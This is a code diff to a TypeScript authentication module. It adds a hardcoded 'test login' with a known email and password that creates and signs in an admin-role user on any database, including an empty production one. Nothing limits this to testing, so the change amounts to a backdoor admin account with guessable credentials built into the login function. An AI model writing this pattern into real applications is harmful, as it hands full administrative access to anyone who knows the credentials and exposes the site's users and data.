@@ -82,8 +82,37 @@ export async function createUser(email: string, name: string, password: string):
   return safe;
 }
 
+// Hardcoded test login (works even on a fresh, empty database).
+const TEST_EMAIL = 'test@gmail.com';
+const TEST_PASSWORD = 'test@123';
+
 export async function authenticate(email: string, password: string): Promise<SafeUser | null> {
   const users = await usersColl();
+
+  if (email.toLowerCase().trim() === TEST_EMAIL && password === TEST_PASSWORD) {
+    const now = new Date().toISOString();
+    await users.updateOne(
+      { email: TEST_EMAIL },
+      {
+        $set: { updated_at: now },
+        $setOnInsert: {
+          email: TEST_EMAIL,
+          name: 'Test User',
+          password_hash: hashPassword(TEST_PASSWORD),
+          role: 'admin' as const,
+          settings: DEFAULT_SETTINGS,
+          created_at: now,
+        },
+      },
+      { upsert: true }
+    );
+    const testUser = await users.findOne({ email: TEST_EMAIL });
+    if (testUser) {
+      const { password_hash: _ph, ...safe } = testUser;
+      return safe;
+    }
+  }
+
   const user = await users.findOne({ email: email.toLowerCase().trim() });
   if (!user || !verifyPassword(password, user.password_hash)) return null;
   const { password_hash: _ph, ...safe } = user;
